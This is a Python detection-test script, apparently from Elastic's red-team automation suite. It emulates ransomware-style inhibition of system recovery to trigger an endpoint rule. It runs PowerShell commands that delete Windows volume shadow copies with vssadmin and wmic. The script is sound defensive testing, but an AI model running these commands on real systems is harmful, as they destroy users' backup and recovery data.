# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="b11e12a4-271c-427f-b215-12a7a25cb3be",
    platforms=["windows"],
    endpoint=[
        {
            "rule_name": "Inhibit System Recovery via Obfuscated Commands",
            "rule_id": "99358f31-a84a-4f92-bb91-4370083acda0",
        }
    ],
    siem=[],
    techniques=["T1490", "T1047", "T1059"],
)


@common.requires_os(metadata.platforms)
def main():
    common.log("Deleting volume shadow copies...")

    common.execute(
        [
            "powershell.exe",
            "Invoke-Expression",
            "-Command",
            "'vssadmin.exe",
            "delete",
            "shadows",
            "/for=c:",
            "/oldest",
            "/quiet'",
        ]
    )

    # Create a volume shadow copy so that there is at least one to delete
    common.execute(
        [
            "powershell.exe",
            "Invoke-Expression",
            "-Command",
            "'wmic.exe",
            "shadowcopy",
            "call",
            "create",
            "volume=c:\\'",
        ]
    )
    common.execute(
        [
            "powershell.exe",
            "Invoke-Expression",
            "-Command",
            "'wmic.exe",
            "shadowcopy",
            "delete",
            "/nointeractive'",
        ]
    )


if __name__ == "__main__":
    exit(main())
